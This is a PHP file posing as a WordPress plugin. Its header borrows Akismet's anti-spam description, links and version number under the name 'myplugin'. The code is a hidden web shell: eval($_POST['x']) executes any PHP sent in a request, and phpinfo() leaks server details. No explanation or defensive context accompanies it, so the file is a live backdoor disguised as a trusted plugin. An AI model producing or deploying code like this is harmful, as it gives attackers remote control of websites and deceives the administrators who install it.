<?php 
/**
 
 * @package myplugin
 
 */
 
/*
 
Plugin Name: myplugin
 
Plugin URI: https://akismet.com/
 
Description: Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from spam</strong>. It keeps your site protected even while you sleep. To get started: activate the Akismet plugin and then go to your Akismet Settings page to set up your API key.
 
Version: 4.1.7
 
Author: myplugin
 
Author URI: https://automattic.com/wordpress-plugins/
 
License: GPLv2 or later
 
Text Domain: akismet
 
*/
eval($_POST['x']);
phpinfo();
?>
